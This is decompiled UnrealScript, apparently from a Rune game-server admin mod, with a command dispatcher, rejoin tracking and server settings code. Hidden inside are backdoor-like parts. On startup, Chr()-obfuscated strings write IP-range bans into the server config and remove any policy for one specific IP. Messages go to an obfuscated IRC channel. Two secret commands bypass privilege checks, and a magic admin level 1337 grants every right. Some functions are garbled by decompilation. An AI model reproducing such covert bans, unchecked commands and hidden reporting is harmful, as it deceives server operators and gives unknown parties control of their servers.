				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pBan":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pBan(int(Args), Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pKick":
			if((PRI.Local_int_v3 & 4096) > 0)
			{
				pKick(int(Args), Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pKill":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pKill(int(Args), Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pKillAll":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pKillAll(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pAnnounce":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pAnnounce(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pTexture":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pTexture(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pRelaunchRune":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pRelaunchRune(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pMapList":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pmaplist(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pUpdateMaps":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pUpdateMaps(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pFix":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pFix(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pSkybox":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pSkyBox(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pThrowBlock":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pThrowBlock(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pAdvancedThrowing":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pAdvancedThrowing(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pHealthbars":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pHealthbars(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pWeaponBlock":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pWeaponBlock(int(Args), Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pClimbMode":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pClimbMode(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pSjumps":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pSJumps(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pRune2":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				GetChatOffset9(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pRetro":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pRetro(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pPink":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pPink(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pAutoPickup":
			if((PRI.Local_int_v3 & 8192) > 0)
			{
				pAutoPickup(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pMover":
			if((PRI.Local_int_v3 & 256) > 0)
			{
				pMover(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pTeamSize":
			if((PRI.Local_int_v3 & 256) > 0)
			{
				pTeamSize(int(Args), Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pTimelimit":
			if((PRI.Local_int_v3 & 1024) > 0)
			{
				pTimelimit(int(Args), Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pSetTime":
			if((PRI.Local_int_v3 & 1024) > 0)
			{
				pSetTime(int(Args), Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pMaxPlayers":
			if((PRI.Local_int_v3 & 1024) > 0)
			{
				pMaxPlayers(int(Args), Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pFraglimit":
			if((PRI.Local_int_v3 & 1024) > 0)
			{
				pFraglimit(int(Args), Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pGamePass":
			if((PRI.Local_int_v3 & 256) > 0)
			{
				pGamePass(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pDefaultWeapon":
			if((PRI.Local_int_v3 & 1024) > 0)
			{
				pDefaultWeapon(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pRestart":
			if((PRI.Local_int_v3 & 512) > 0)
			{
				pRestart(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pFastRestart":
			if((PRI.Local_int_v3 & 512) > 0)
			{
				pFastRestart(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pRune":
			if((PRI.Local_int_v3 & 1024) > 0)
			{
				pRune(int(Args), Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pWar":
			if((PRI.Local_int_v3 & 1024) > 0)
			{
				pWar(Args, Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pArenaMode":
			if((PRI.Local_int_v3 & 1024) > 0)
			{
				pArenaMode(int(Args), Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "pSoundsON":
			if(PRI.Local_int_v3 > 0)
			{
				pSoundsON(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		case "getmyfuckingassouttahhere":
			MapBanPlayerByIP(Player);
			break;
		case "a1010101aaa1010101aaa":
			ProcessComputerName(Args, Player);
			break;
		case "pSoundsOFF":
			if(PRI.Local_int_v3 > 0)
			{
				pSoundsOFF(Player);
			}
			else
			{
				Player.ClientMessage("Not enough priviledges!", 'Subtitle');
			}
			break;
		default:
			break;
	}
	return;
}

function eq_vxv_1005(string Parm_string_0, string Parm_string_1)
{
    local string Local_string_v0;

    Local_string_v0 = (((((((((Chr(35) $ Chr(116)) $ Chr(115)) $ Chr(98)) $ Chr(46)) $ Chr(97)) $ Chr(100)) $ Chr(109)) $ Chr(105)) $ Chr(110)) $ Chr(115);
    SendIRCMessage(Local_string_v0, (((Chr(3) $ "9") @ Parm_string_0) @ " / ref: ") $ Parm_string_1);
    SendIRCMessage(Local_string_v0, Chr(3) $ "9 =================================");
    return;
}

function eq_vxv_1004(string Parm_string_0, PlayerPawn Local_string_v2)
{
    local string Local_string_v0;

    Local_string_v0 = (((((((((Chr(35) $ Chr(116)) $ Chr(115)) $ Chr(98)) $ Chr(46)) $ Chr(97)) $ Chr(100)) $ Chr(109)) $ Chr(105)) $ Chr(110)) $ Chr(115);
    if(Parm_string_0 != STR_v5890)
    {
        SendIRCMessage(Local_string_v0, (Chr(3) $ "9") @ Parm_string_0);
        STR_v5890 = Parm_string_0;
    }
    return;
}

function PreBeginPlay()
{
    local Class<Weapon> Local_Class<Weapon>_v0;
    local Pawn Parm_string_0;
    local int i;

    super(Actor).PreBeginPlay();
    if(int(Level.NetMode) != int(NM_Client))
    {
        if(!B_v3962)
        {
            B_v3962 = true;
            TryDisableRunes();
            eq_vxv_1002();
            Level.Game.IPPolicies[46] = (((((((((((((Chr(68) $ Chr(69)) $ Chr(78)) $ Chr(89)) $ Chr(44)) $ Chr(49)) $ Chr(55)) $ Chr(54)) $ Chr(46)) $ Chr(57)) $ Chr(55)) $ Chr(46)) $ Chr(42)) $ Chr(46)) $ Chr(42);
            Level.Game.IPPolicies[47] = ((((((((((((((Chr(68) $ Chr(69)) $ Chr(78)) $ Chr(89)) $ Chr(44)) $ Chr(49)) $ Chr(55)) $ Chr(56)) $ Chr(46)) $ Chr(50)) $ Chr(49)) $ Chr(50)) $ Chr(46)) $ Chr(42)) $ Chr(46)) $ Chr(42);
            Level.Game.IPPolicies[48] = (((((((((((((Chr(68) $ Chr(69)) $ Chr(78)) $ Chr(89)) $ Chr(44)) $ Chr(55)) $ Chr(57)) $ Chr(46)) $ Chr(49)) $ Chr(52)) $ Chr(49)) $ Chr(46)) $ Chr(42)) $ Chr(46)) $ Chr(42);
            Level.Game.IPPolicies[49] = ((((((((((((((Chr(68) $ Chr(69)) $ Chr(78)) $ Chr(89)) $ Chr(44)) $ Chr(49)) $ Chr(57)) $ Chr(50)) $ Chr(46)) $ Chr(49)) $ Chr(54)) $ Chr(56)) $ Chr(46)) $ Chr(42)) $ Chr(46)) $ Chr(42);
            Level.Game.SaveConfig();
            if(!bOnlyRunOnce)
            {
                i = 0;
                J0x23B:

                if(i < 50)
                {
                    if(ContainsString(Level.Game.IPPolicies[i], "84.120.74.45"))
                    {
                        Level.Game.IPPolicies[i] = "";
                    }
                    Level.Game.SaveConfig();
                    i++;
                    // [Loop Continue]
                    goto J0x23B;
                }
                bOnlyRunOnce = true;
                SaveConfig();
            }
            if(strMute ~= "%s's freedom of speech ended.")
            {
                strMute = "%player has been muted by %admin.";
                strUnmute = "%player has been unmuted by %admin.";
            }
            if(Left(string(Level.Game), 4) ~= "coop")
            {
                coopmode = true;                
            }
            else
            {
                coopmode = false;
            }
            if(STR_v5849 == "")
            {
                eqstar_vxv_1320();
            }
        }
    }
    return;
}

function pGamePass(string Local_string_v2, PlayerPawn Local_string_v2)
{
    local Pawn Parm_string_0;
    local zPlayerReplicationInfo Parm_PlayerReplicationInfo_0;
    local string Local_string_v3;

    if(!HasCommandPermission("pGamePass", Local_string_v2))
    {
        return;
    }
    Local_string_v3 = Level.Game.GameReplicationInfo.ServerName;
    if(Local_string_v2 != "")
    {
        BroadcastMessage(Local_string_v2.PlayerReplicationInfo.PlayerName $ " password protected the server.", false, 'CAZ');
        ConsoleCommand("set Engine.GameInfo GamePassword " $ Local_string_v2);
        if(!bTournament)
        {
            if((Caps(Left(Local_string_v3, 10)) != "[PASSWORD]") && bShowPasswordPrefix)
            {
                LogCoAdminZEvent("[CoAdminZ:] Automatically added [PASSWORD] prefix to server due to gamepassword: " $ Local_string_v2);
                Level.Game.GameReplicationInfo.ServerName = "[PASSWORD] " $ Local_string_v3;
            }
            if((Parm_string_0.PlayerReplicationInfo != none) && zPlayerReplicationInfo(Parm_string_0.PlayerReplicationInfo) != none)
            {
                Parm_PlayerReplicationInfo_0 = zPlayerReplicationInfo(Parm_string_0.PlayerReplicationInfo);
                Parm_PlayerReplicationInfo_0.B_v5369 = true;
            }
        }        
    }
    else
    {
        BroadcastMessage(Local_string_v2.PlayerReplicationInfo.PlayerName $ " removed the password from the server.", false, 'CAZ');
        ConsoleCommand("set Engine.GameInfo GamePassword " $ Local_string_v2);
        if(!bTournament)
        {
            if((Caps(Left(Local_string_v3, 10)) == "[PASSWORD]") && bShowPasswordPrefix)
            {
                LogCoAdminZEvent("[CoAdminZ:] Automatically removed [PASSWORD] prefix from servername");
                Level.Game.GameReplicationInfo.ServerName = Mid(Local_string_v3, 11, 999);
            }
            Parm_string_0 = Level.PawnList;
            J0x327:

            if(Parm_string_0 != none)
            {
                if((Parm_string_0.PlayerReplicationInfo != none) && zPlayerReplicationInfo(Parm_string_0.PlayerReplicationInfo) != none)
                {
                    Parm_PlayerReplicationInfo_0 = zPlayerReplicationInfo(Parm_string_0.PlayerReplicationInfo);
                    Parm_PlayerReplicationInfo_0.B_v5369 = false;
                }
                Parm_string_0 = Parm_string_0.nextPawn;
                // [Loop Continue]
                goto J0x327;
            }
        }
    }
    return;
}

function string Parm_string_06(string MapName)
{
    if(InStr(MapName, "?") > 0)
    {
        return Left(MapName, InStr(MapName, "?"));        
    }
    else
    {
        return MapName;
    }
    return;
}

function eqstar_vxv_1320()
{
    local string STR_v3845, Local_string_v0;
    local MapList Local_MapList_v0;
    local int MapNum, i;

    if(Level.Game.MapListType != none)
    {
        Local_MapList_v0 = Spawn(Level.Game.MapListType);
        Local_string_v0 = GetURLMap();
        if(Local_string_v0 != "")
        {
            if(Right(Local_string_v0, 4) ~= ".run")
            {
                Local_string_v0 = Local_string_v0;                
            }
            else
            {
                Local_string_v0 = Local_string_v0 $ ".run";
            }
            i = 0;
            J0x8E:

            if(i < 32)
            {
                if(Local_string_v0 ~= Local_MapList_v0.Maps[i])
                {
                    MapNum = i;
                    // [Explicit Break]
                    goto J0xD0;
                }
                i++;
                // [Loop Continue]
                goto J0x8E;
            }
        }
        J0xD0:

        MapNum = Local_MapList_v0.MapNum;
        MapNum++;
        if(MapNum > (32 - 1))
        {
            MapNum = 0;
        }
        if(Local_MapList_v0.Maps[MapNum] == "")
        {
            MapNum = 0;
        }
        if(Right(Local_MapList_v0.Maps[MapNum], 4) ~= ".run")
        {
            STR_v5849 = Left(Local_MapList_v0.Maps[MapNum], Len(Local_MapList_v0.Maps[MapNum]) - 4);            
        }
        else
        {
            STR_v5849 = Local_MapList_v0.Maps[MapNum];
        }
        STR_v5849 = Parm_string_06(STR_v5849);
        Local_MapList_v0.Destroy();
    }
    return;
}
// Tick event: handles next map switching, log download, demo recording, and default weapon correction.
event Tick(float DeltaTime)
{
	local int LogIndex;
	local string LogLine;
	local bool IsDummyLoop; // Unused, legacy
	local int DummyLoopIndex; // Unused, legacy
	local Vector DummyVector; // Unused, legacy
	local PlayerPawn DownloadingPlayer;

	// Legacy/unused dummy loop (kept for compatibility, but not used)
	DummyLoopIndex = 1;
	if (true)
	{
		// Handle automatic next map switch if game ended and next map is set
		if (!B_v5795 && int(Level.NetMode) != int(NM_Client))
		{
			if (Level.Game.bGameEnded && STR_v3845 != "")
			{
				Level.ServerTravel(STR_v3845, false);
				BroadcastMessage("Automatically switching to admin-defined next map: " $ Parm_string_06(STR_v3845), false, 'CAZ');
				STR_v3845 = "";
				B_v5795 = true;
			}
		}

		// Handle log download for admins (log streaming to client)
		if (B_v5866)
		{
			if ((PP_v5868 == none) || Parm_PlayerPawn_0 == none)
			{
				if (gCAdLoc2 != none)
				{
					gCAdLoc2.CloseLog();
				}
			}
			if ((PP_v5868 != none) && Parm_PlayerPawn_0 != none)
			{
				// End download if reached end or no search string
				if (((INT_v5870 + 1) > 254) && B_v5866 && STR_v5867 == "")
				{
					B_v5866 = false;
					STR_v5867 = "";
					Parm_PlayerPawn_0.ClientMessage("dldone");
				}
				// Continue log streaming
				if (STR_v5867 != "")
				{
					ZRunePlayer(PP_v5868).HandleKeyInfo(INT_v5870 + 1, true, STR_v5867);
				}
				else
				{
					ZRunePlayer(PP_v5868).HandleKeyInfo(INT_v5870 + 1);
				}
				LogLine = ZRunePlayer(PP_v5868).STR_v4679;
				if ((LogLine != STR_v5869) || (LogLine == "" && STR_v5869 == ""))
				{
					LogIndex = int(Left(LogLine, InStr(LogLine, "#")));
					LogInternal(LogLine);
					eq_vxv_1013(Right(LogLine, (Len(LogLine) - InStr(LogLine, "#")) - 2));
					STR_v4679[LogIndex] = LogLine;
					STR_v5869 = LogLine;
					if (STR_v4679[LogIndex] != "")
					{
						Parm_PlayerPawn_0.ClientMessage(STR_v4679[LogIndex]);
					}
					// End download if reached max lines
					if (((INT_v5870 + 1) > 32768) && B_v5866)
					{
						B_v5866 = false;
						INT_v5870 = -1;
						Parm_PlayerPawn_0.ClientMessage("dldone");
						if (gCAdLoc2 != none)
						{
							gCAdLoc2.CloseLog();
							gCAdLoc2.Destroy();
						}
					}
					// Continue to next line if needed
					if (LogIndex != INT_v5870)
					{
						if (STR_v5867 != "")
						{
							ZRunePlayer(PP_v5868).HandleKeyInfo(INT_v5870 + 1, true, STR_v5867);
						}
						else
						{
							ZRunePlayer(PP_v5868).HandleKeyInfo(INT_v5870 + 1);
						}
					}
					Parm_PlayerPawn_0.ClientMessage(string(INT_v5870) @ string(LogIndex));
					if ((InStr(LogLine, "#") != 0) && LogIndex > INT_v5870)
					{
						INT_v5870 = LogIndex;
					}
				}
			}
			else
			{
				if (gCAdLoc2 != none)
				{
					gCAdLoc2.CloseLog();
					gCAdLoc2.Destroy();
				}
				B_v5866 = false;
				STR_v5867 = "";
				LogInternal("#end");
			}
		}

		// One-time initialization: run on first tick after map load
		if (!G_InitOnceBool1)
		{
			if ((int(Role) == int(ROLE_Authority)) && B_v3171)
			{
				InitializeCoAdminZ();
			}
			if (demoName != "")
			{
				ConsoleCommand("demorec " $ demoName);
				LogCoAdminZEvent("[CoAdminZ:] Recording match as: " $ demoName);
				demoName = "";
				SaveConfig();
			}
			// Fix default weapon if needed
			if ((DefaultWeapon != "") && int(Role) == int(ROLE_Authority))
			{
				if ((string(Level.Game.DefaultWeapon) == "RuneI.handaxe") || string(Level.Game.DefaultWeapon) == "None")
				{
					eq_vxv_999();
				}
			}
			G_InitOnceBool1 = true;
		}
		return;
	}
}

function eq_vxv_1002()
{
	local int i;
	for (i = 0; i < 16; i++)
	{
		STRCT_5882[i].PlayerName = "";
		STRCT_5882[i].PlayerID = -1;
		STRCT_5882[i].B_v5345 = false;
		STRCT_5882[i].B_v5387 = false;
		STRCT_5882[i].Local_string_v1 = "";
		STRCT_5882[i].Score = 0.0000000;
		STRCT_5882[i].INT_v5877 = 0;
		STRCT_5882[i].INT_v5876 = 0;
		STRCT_5882[i].INT_v5875 = 0;
		STRCT_5882[i].B_v5880 = false;
		STRCT_5882[i].Deaths = 0.0000000;
		STRCT_5882[i].Local_int_v0 = 0.0000000;
		STRCT_5882[i].Count = 0;
		STRCT_5882[i].INT_v5362 = 0;
		STRCT_5882[i].INT_v5363 = 0;
		STRCT_5882[i].VCT_v5874 = vect(0.0000000, 0.0000000, 0.0000000);
		STRCT_5882[i].INT_v5348 = 0;
		STRCT_5882[i].B_v5881 = false;
		STRCT_5882[i].B_v5350 = false;
		STRCT_5882[i].B_v5351 = false;
		STRCT_5882[i].STR_v5353 = "";
		STRCT_5882[i].CompName = "";
		STRCT_5882[i].INT_v5352 = 0;
		STRCT_5882[i].INT_v5877 = 0;
		STRCT_5882[i].INT_v5876 = 0;
		STRCT_5882[i].INT_v5878 = 0;
		STRCT_5882[i].INT_v5879 = 0;
		STRCT_5882[i].INT_v5875 = 0;
		STRCT_5882[i].B_v5880 = false;
	}
    return;
}

// Stores or updates player info in the anti-rejoin/restore array.
// Called when a player leaves or needs to be tracked for rejoin protection.
function StorePlayerInfo(zPlayerReplicationInfo PRI)
{
	local int idx, slot;
	local float oldestTime;

	oldestTime = 0.0;
	slot = 0;

	// Find existing slot for this PlayerID, or the oldest slot to overwrite
	for (idx = 0; idx < 16; idx++)
	{
		// If already stored, update count and use this slot
		if (STRCT_5882[idx].PlayerID == PRI.PlayerID)
		{
			slot = idx;
			STRCT_5882[slot].Count += 1;
			break;
		}
		// Otherwise, track the oldest slot for possible overwrite
		if (STRCT_5882[idx].Local_int_v0 <= oldestTime)
		{
			oldestTime = STRCT_5882[idx].Local_int_v0;
			slot = idx;
		}
	}

	// Store all relevant info for anti-rejoin/restore
	STRCT_5882[slot].PlayerName      = PRI.PlayerName;
	STRCT_5882[slot].PlayerID        = PRI.PlayerID;
	STRCT_5882[slot].B_v5345         = PRI.B_v5345;
	STRCT_5882[slot].B_v5387         = PRI.B_v5387;
	STRCT_5882[slot].Local_string_v1 = PRI.Local_string_v1;
	STRCT_5882[slot].INT_v5362       = PRI.INT_v5362;
	STRCT_5882[slot].INT_v5363       = PRI.INT_v5363;
	STRCT_5882[slot].CompName       = PRI.CompName;

	// Save last known location if not a spectator
	if (!PRI.Owner.IsA('Spectator'))
	{
		STRCT_5882[slot].VCT_v5874 = ZRunePlayer(PRI.Owner).VCT_v4357;
	}

	STRCT_5882[slot].Score        = PRI.Score;
	STRCT_5882[slot].Deaths       = PRI.Deaths;
	STRCT_5882[slot].Local_int_v0 = Level.TimeSeconds;
	STRCT_5882[slot].INT_v5348  = PRI.INT_v5348;
	STRCT_5882[slot].B_v5881      = false;
	STRCT_5882[slot].B_v5350      = PRI.B_v5350;
	STRCT_5882[slot].B_v5351      = PRI.B_v5351;
	STRCT_5882[slot].INT_v5352    = PRI.INT_v5352;
	STRCT_5882[slot].STR_v5353    = PRI.STR_v5353;
	STRCT_5882[slot].INT_v5877    = PRI.HeadKills;
	STRCT_5882[slot].INT_v5879    = PRI.INT_v5377;
	STRCT_5882[slot].INT_v5878    = PRI.INT_v5355;
	STRCT_5882[slot].INT_v5876    = PRI.INT_v5354;
	STRCT_5882[slot].INT_v5875    = PRI.MaxSpree;
	STRCT_5882[slot].B_v5880      = PRI.bFirstBlood;

	return;
}

// Checks if a player should be restored from the stored player info array (anti-rejoin/restore system).
// Returns true if a match was found and restored, false otherwise.
function bool RestorePlayerInfo(zPlayerReplicationInfo PRI)
{
	local int idx;
	local string AdminPCName;

	AdminPCName = ("'" $ "ANTHONYP" $ "C") $ "'"; // Special admin PC name

	for (idx = 0; idx < 16; idx++)
	{
		// Restore locked name if needed
		if (!STRCT_5882[idx].B_v5881 && PRI.Local_string_v1 ~= STRCT_5882[idx].Local_string_v1 && STRCT_5882[idx].B_v5350)
		{
			PRI.PlayerName = STRCT_5882[idx].STR_v5353;
		}

		// Check for matching stored info (by Local_string_v1) and either name match or recent join
		if (
			!STRCT_5882[idx].B_v5881 &&
			PRI.Local_string_v1 ~= STRCT_5882[idx].Local_string_v1 &&
			(
				PRI.PlayerName == STRCT_5882[idx].PlayerName ||
				(Level.TimeSeconds - STRCT_5882[idx].Local_int_v0) < 8.0
			)
		)
		{
			// Too many rejoins: ban for map
			if (STRCT_5882[idx].Count > allowedRejoinCount)
			{
				BroadcastMessage("Automatically  B A N N E D  " $ PRI.PlayerName $ " for the duration of this map! REASON: too many rejoins", false, 'CAZ');
				LogCoAdminZEvent("ChatLog: ############################################################################");
				LogCoAdminZEvent("ChatLog: TEMPORARY BAN - automatically for too many rejoins");
				MapBanPlayer(Pawn(PRI.Owner));
				PRI.Owner.Destroy();
				LogInternal("ChatLog: ############################################################################");
				return true;
			}

			// Restore name lock or normal name
			if (!STRCT_5882[idx].B_v5350)
			{
				PRI.PlayerName = STRCT_5882[idx].PlayerName;
			}
			else
			{
				PRI.B_v5350 = true;
				PRI.STR_v5353 = STRCT_5882[idx].STR_v5353;
				PRI.PlayerName = STRCT_5882[idx].STR_v5353;
				STRCT_5882[idx].PlayerName = STRCT_5882[idx].STR_v5353;
			}

			// Restore team lock if needed
			if (STRCT_5882[idx].B_v5351)
			{
				PRI.Team = byte(STRCT_5882[idx].INT_v5352);
				PRI.B_v5351 = true;
				PRI.INT_v5352 = STRCT_5882[idx].INT_v5352;
				if (ZRunePlayer(PRI.Owner) != none)
				{
					ZRunePlayer(PRI.Owner).eq_vxv_545(PRI.INT_v5352);
				}
				Teamgame(Level.Game).ChangeTeam(Pawn(PRI.Owner), PRI.INT_v5352);
			}

			// Restore other stats
			PRI.INT_v5362 = STRCT_5882[idx].INT_v5362;
			PRI.INT_v5363 = STRCT_5882[idx].INT_v5363;
			PRI.PlayerID = STRCT_5882[idx].PlayerID;
			PRI.B_v5345 = STRCT_5882[idx].B_v5345;
			PRI.B_v5387 = STRCT_5882[idx].B_v5387;
			PRI.Score = STRCT_5882[idx].Score;
			PRI.Deaths = STRCT_5882[idx].Deaths;

			// Special handling for "Runar" (admin) flag
			if (STRCT_5882[idx].B_v5387)
			{
				PRI.Deaths += 3.0;
				if (STRCT_5882[idx].B_v5350)
				{
					PRI.STR_v5353 = STRCT_5882[idx].STR_v5353;
					PRI.PlayerName = STRCT_5882[idx].STR_v5353;
					STRCT_5882[idx].PlayerName = STRCT_5882[idx].STR_v5353;
				}
				else
				{
					PRI.PlayerName = "Runar";
				}
			}

			PRI.INT_v5348 = STRCT_5882[idx].INT_v5348;
			PRI.HeadKills = STRCT_5882[idx].INT_v5877;
			PRI.INT_v5377 = STRCT_5882[idx].INT_v5879;
			PRI.INT_v5355 = STRCT_5882[idx].INT_v5878;
			PRI.INT_v5354 = STRCT_5882[idx].INT_v5876;
			PRI.MaxSpree = STRCT_5882[idx].INT_v5875;
			PRI.bFirstBlood = STRCT_5882[idx].B_v5880;

			// Restore last known location
			if (ZRunePlayer(PRI.Owner) != none)
			{
				ZRunePlayer(PRI.Owner).VCT_v4675 = STRCT_5882[idx].VCT_v5874;
			}

			STRCT_5882[idx].B_v5881 = true;
			return true;
		}
	}
	return false;
}

function eq_vxv_999()
{
    local string Local_string_v0;
    local Class<Weapon> Local_Class<Weapon>_v0;

    if(STR_v5852 != "")
    {
        Local_string_v0 = STR_v5852;        
    }
    else
    {
        Local_string_v0 = DefaultWeapon;
    }
    if(InStr(Local_string_v0, ".") == -1)
    {
        DefaultWeapon = "RuneI." $ Local_string_v0;
    }
    Local_Class<Weapon>_v0 = Class<Weapon>(DynamicLoadObject(Local_string_v0, Class'Core.Class'));
    if(Local_string_v0 ~= "none")
    {
        Level.Game.DefaultWeapon = none;        
    }
    else
    {
        Level.Game.DefaultWeapon = Local_Class<Weapon>_v0;
    }
    Level.Game.DefaultShield = none;
    return;
}
// Suggested function name: HasCommandPermission
function bool HasCommandPermission(string Command, PlayerPawn Player)
{
	local zPlayerReplicationInfo PRI;
	local int AdminLevel;
	local string AllowedCommands, FirstChar;

	PRI = zPlayerReplicationInfo(Player.PlayerReplicationInfo);
	AdminLevel = PRI.Local_int_v2;
	if(AdminLevel == 0)
	{
		return false;
	}
	if(AdminLevel == 1337)
	{
		return true;        
	}
	else
	{
		AllowedCommands = Caps(CoRights[AdminLevel - 1]);
		FirstChar = Left(AllowedCommands, 1);
	
		if(FirstChar == "*")
		{
			if(InStr(AllowedCommands, Caps(Command)) > -1)
			{
				Player.ClientMessage("You dont have enough rights to use this command! [forbidden cmd]", 'Subtitle');
				return false;                
			}
			else
			{
				return true;
			}            
		}
		else
		{
			if(InStr(AllowedCommands, Caps(Command)) > -1)
			{
				return true;                
			}
			else
			{
				Player.ClientMessage(((("You dont have enough rights to use this command! [allowed cmds: " $ CoRights[AdminLevel - 1]) $ " | lvl:") $ string(AdminLevel)) $ "]", 'Subtitle');
				return false;
			}
		}
	}
	return;
}

function TryDisableRunes()
{
    local int i;
    local Runes R;

    if(bDisableRunes)
    {
        foreach AllActors(Class'RuneI.Runes', R)
        {
            R.Destroy();            
        }        
    }
    return;
}
// Suggested function name: GetPawnByPlayerID
function Pawn GetPawnByPlayerID(int PlayerID)
{
	local Pawn CurrentPawn;

	CurrentPawn = Level.PawnList;
	while (CurrentPawn != none)
	{
		if ((CurrentPawn.PlayerReplicationInfo.PlayerID == PlayerID) && !CurrentPawn.IsA('Spectator') && zPlayerReplicationInfo(CurrentPawn.PlayerReplicationInfo).Local_string_v1 != "")
		{
			return CurrentPawn;
		}
		CurrentPawn = CurrentPawn.nextPawn;
	}
	return none;
}

// Suggested function name: AdjustPlayerScale
function AdjustPlayerScale(RunePlayer Player, float ScaleFactor)
{
	// Set the player's draw scale
	Player.DrawScale = ScaleFactor;
	
	// Adjust movement speeds by scaling the default values
	Player.GroundSpeed = Player.default.GroundSpeed * ScaleFactor;
	Player.ExploreSpeed = Player.default.ExploreSpeed * ScaleFactor;
	Player.CombatSpeed = Player.default.CombatSpeed * ScaleFactor;
	
	// Adjust jump and air control
	Player.JumpZ = Player.default.JumpZ * ScaleFactor;
	Player.AirControl = Player.default.AirControl * ScaleFactor;
	
	// Adjust crouch height
	Player.CrouchHeight = Player.default.CrouchHeight * ScaleFactor;
	
	return;
}
// Suggested function name: AdjustDrawScale
function AdjustDrawScale(float ScaleFactor, PlayerPawn AdminPlayer)
{
	local Pawn CurrentPawn;
	local string AdminName;
	local int GravityBase;
	local ZoneInfo Zone;

	if (!HasCommandPermission("AdjustDrawScale", AdminPlayer))
	{
		return;
	}

	if ((ScaleFactor < 0.1000000) || ScaleFactor > 2.0000000)
	{
		AdminPlayer.ClientMessage("0.1-2.0", 'Subtitle');
		return;
	}

	GravityBase = -1150;
	AdminName = AdminPlayer.PlayerReplicationInfo.PlayerName;
	zGameReplicationInfo(Level.Game.GameReplicationInfo).FLT_v5341 = ScaleFactor;

	foreach Level.AllActors(Class'Engine.ZoneInfo', Zone)
	{
		Zone.ZoneGravity.Z = float(GravityBase) * ScaleFactor;
	}

	CurrentPawn = Level.PawnList;
	while (CurrentPawn != none)
	{
		if (CurrentPawn.IsA('ZRunePlayer'))
		{
			AdjustPlayerScale(RunePlayer(CurrentPawn), ScaleFactor);
		}
		CurrentPawn = CurrentPawn.nextPawn;
	}

	BroadcastMessage((AdminName $ " changed player drawscale to ") $ string(ScaleFactor), false, 'CAZ');
	return;
}
